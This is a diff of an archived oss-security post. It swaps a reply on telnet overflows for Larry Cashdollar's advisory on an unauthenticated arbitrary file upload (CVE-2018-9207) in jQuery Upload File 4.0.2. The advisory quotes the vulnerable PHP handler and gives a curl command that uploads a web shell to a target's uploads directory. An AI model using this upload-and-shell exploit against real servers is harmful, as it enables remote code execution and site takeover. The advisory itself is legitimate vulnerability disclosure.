@@ -1,26 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/12/10
-Message-ID: <alpine.GSO.2.20.1812121308451.10494@scrappy.simplesystems.org>
-Date: Wed, 12 Dec 2018 13:10:24 -0600 (CST)
-From: Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>
-To: oss-security@...ts.openwall.com
-Subject: Re: Multiple telnet.c overflows
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/20/8
+Message-id: <0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>
+Date: Tue, 20 Nov 2018 17:07:09 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
 Content-Type: text/plain; charset=utf-8
 
-On Wed, 12 Dec 2018, Tavis Ormandy wrote:
+Title: Arbitrary file upload vulnerability in Hayageek jQuery Upload File v4.0.2
+Author: Larry W. Cashdollar, @_larry0
+Date: 2018-11-02
+CVE-ID:[ CVE-2018-9207
+CWE: CWE-434 arbitrary file upload
+Download Site: http://hayageek.com/docs/jquery-upload-file.php
+Vendor: Hayageek
+Vendor Notified: 2018-11-02
+Vendor Contact: hayageek@...il.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=206
 
-> It's not that environment handling is a non-issue, I've reported
-> dozens over the years, it's just that it requires a privilege
-> boundary. For example, setuid binaries are the classic example.
+Description: jQuery Upload File plugin provides Multiple file Uploads with progress bar.Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
 
-Is a network connection between two machines not a 'privilege 
-boundary'?  If the remote machine has the ability to subvert the 
-accessing machine (e.g. by transmitting something which causes harm to 
-the client) then that seems to qualify.
+Vulnerability:
+The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/upload.php doesn't check for a file type or for requiring any authentication allowing a user to upload an executable file to the /uploads/ directory if it exists. if(!is_array($_FILES["myfile"]["name"])) //single file { $fileName = $_FILES["myfile"]["name"]; move_uploaded_file($_FILES["myfile"]["tmp_name"],$output_dir.$fileName); $ret[]= $fileName; } else //Multiple files, file[] { $fileCount = count($_FILES["myfile"]["name"]); for($i=0; $i < $fileCount; $i++) { $fileName = $_FILES["myfile"]["name"][$i]; move_uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName); $ret[]= $fileName; }
 
-Bob
--- 
-Bob Friesenhahn
-bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
-GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
-Public Key,     http://www.simplesystems.org/users/bfriesen/public-key.txt
+Exploit Code:
+1. $ curl  -F  "myfile=@...ll.php" "http://example.com/jquery-upload-file/php/upload.php"
+2. ["shell.php"]
+3.  
+4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shittyshell.php
+5.  
+6.  
+7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell.php
+
+
+
